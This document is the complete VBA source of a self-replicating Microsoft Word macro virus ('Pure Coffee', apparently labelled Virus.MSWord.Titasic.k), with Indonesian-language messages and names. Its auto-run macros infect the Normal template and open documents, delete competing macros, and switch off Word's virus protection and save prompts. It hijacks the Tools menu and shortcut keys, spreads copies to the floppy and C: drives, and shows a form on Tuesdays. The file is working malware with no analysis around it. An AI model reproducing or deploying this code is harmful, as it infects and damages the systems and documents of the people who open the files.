   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Pure"
   Public AD As Object, aDes As Variant
   Public Lain As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
   Function Main()
   Dim nmak(1) As String
   Dim NT As Object
   Dim aSrc$
   On Error GoTo selesai
   nmak(0) = "Pure"
   nmak(1) = "Coffee"

   aSrc = MacroContainer
   Set NT = NormalTemplate
   If Not DocCount Then
   Set AD = ActiveDocument
   ElseIf aSrc <> "pc.dot" Then
   aSrc = NT
   End If

   If aSrc = NT Then
   aSrc = NT.FullName: Set aDes = AD
   ElseIf aSrc = AD Then
   aSrc = AD.FullName: Set aDes = NT
   ElseIf aSrc = "pc.dot" Then
   Set aDes = NT
   aSrc = Options.DefaultFilePath(8) & "\pc.src"
   End If

   Buang aDes
   With aDes.VBProject
   If Not (Not hapus And .Description = "Pure" And .VBComponents.Count > 2) Then
       Tempel aSrc, aDes, nmak
       hapus = False
       .Description = "Pure"
       If aDes = NT Then
           Options.SaveInterval = 0
           CustomizationContext = NT
           CommandBars("Tools").reset
           KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
           Command:="ToolsRecordMacroStart"
           aDes.Save
       End If
   Else
   GoTo Aksi
   End If
   End With
   If afound = True Then Exit Function
   Refresh
   On Error Resume Next
   Aksi:
   If aExc = True Then Exit Function
   Exit Function
   selesai:
   If Err.Number = 50289 Then MsgBox "Siip ... sesuatu yang diproteksi itu terkadang memang lebih aman", vbInformation, "Pure Coffee !"
   End Function

   Sub Buang(Sfile)
   Dim nmak As Object
   For Each nmak In Sfile.VBProject.VBComponents
       If nmak.Name = "NewMacros" Then Lain = True
       If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
       And nmak.Name <> "Pure" And nmak.Name <> "Coffee" Then
           hapus = True
           If reset Then
           Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
           Else
           nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
           End If
       End If
   Next nmak
   End Sub
   Sub Tempel(Sfile, Dfile, nmak)
   Dim aNmak
   For Each aNmak In nmak
   Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
   Next
   End Sub
   Sub FileOpen()
   WBT
   If Dialogs(80).Show <> 0 Then
   WBF
   AutoOpen
   Else
   WBF
   End If
   End Sub
   Sub AutoOpen()
   Application.EnableCancelKey = wdCancelDisabled
   Main
   If Documents.Count > 1 Then
       For i = 1 To Documents.Count
       If Documents(i).Name <> ActiveDocument.Name Then
       Set AD = Documents(i)
       DocCount = True
       hapus = False
       Main
       End If
       Next
   End If
   Chika

   End Sub
   Sub ViewVBCode()
   WBT
   End Sub
   Sub AutoExec()
   On Error Resume Next
   If MacroContainer <> NormalTemplate Then
   aExc = True
   Main
   WBT
   AddIns.Unload False
   WBF
   End If
   Application.EnableCancelKey = wdCancelDisabled
   End Sub
   Sub AutoExit()
   Dim aAddin As Object
   On Error GoTo batal
   WBT
   If Documents.Count <> 0 Then Documents.Close
   Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
   afound = True
   For Each aAddin In AddIns
       If aAddin.Name = "pc.dot" Then afound = False
   Next aAddin

   If afound = True Then
   Application.Visible = False
   Documents.Add
   Main
       With ActiveDocument
           .SaveAs FileName:=Options.DefaultFilePath(8) & "\pc.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
           .SaveAs FileName:=Options.DefaultFilePath(8) & "\pc.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
       End With
   End If
   Application.Quit
   batal:
   WBF
   End Sub
   Sub ToolsMacro()
   WBF
   On Error GoTo batal
   Buang ActiveDocument
   If Lain Then
       If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".astia.ToolsMacro": Exit Sub
       Application.DisplayAlerts = 0
           With Dialogs(215)
           .Description = "Please ... beri gue kesempatan untuk menetap di sini !"
           If .Display = 1 Then .Execute
           End With
       Application.DisplayAlerts = -1
   Else
   ViewVBCode
   End If
   batal:
   End Sub
   Sub FileTemplates()
   WBF
   If Not reset Then Dialogs(87).Display
   End Sub
   Sub FormatStyle()
   WBF
   Dialogs(180).Show
   End Sub
   Function Refresh()
   reset = True
   FileTemplates
   Buang aDes
   End Function
   Sub AutoClose()
   Application.DisplayAlerts = -1
   With Options
   .SaveNormalPrompt = False
   .SaveInterval = 0
   .VirusProtection = False
   End With
   If ActiveWindow.Caption <> "Coffee" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
   And ActiveDocument.Name <> "pc.dot" Then Main
   nyebar
   End Sub
   Sub FileExit()
   AutoExit
   End Sub
   Sub ToolsOptions()
   Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
   Dialogs(wdDialogToolsOptions).Show
   Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
   End Sub
   Function WBT()
   WordBasic.DisableAutoMacros True
   End Function
   Function WBF()
   WordBasic.DisableAutoMacros False
   End Function
   Sub nyebar()
   On Error GoTo sia
   If Dir("a:\chika.doc") = "" Then
       ActiveDocument.SaveAs "a:\chika.doc"
       ActiveDocument.Saved = True
       ActiveDocument.Close
   Else
       ActiveDocument.SaveAs "c:\chika.doc"
       ActiveDocument.Saved = True
       ActiveDocument.Close
   End If
   sia:
   End Sub
   Sub Chika()
   On Error GoTo sia2
   If WeekDay(Date) = 3 Then
       Application.Visible = False
       Coffee.Show
   End If
   sia2:
   End Sub


   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} Coffee
      Caption         =   "Pure Coffee !"
      ClientHeight    =   1890
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   4140
      OleObjectBlob   =   "Virus.MSWord.Titasic.k-Coffee.frx":0000
      StartUpPosition =   2  'CenterScreen
   End
   Attribute VB_Name = "Coffee"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False












































   Private Sub CommandButton1_Click()
   Unload Me
   Application.Visible = True
   End
   End Sub



   Private Sub UserForm_Click()

   End Sub
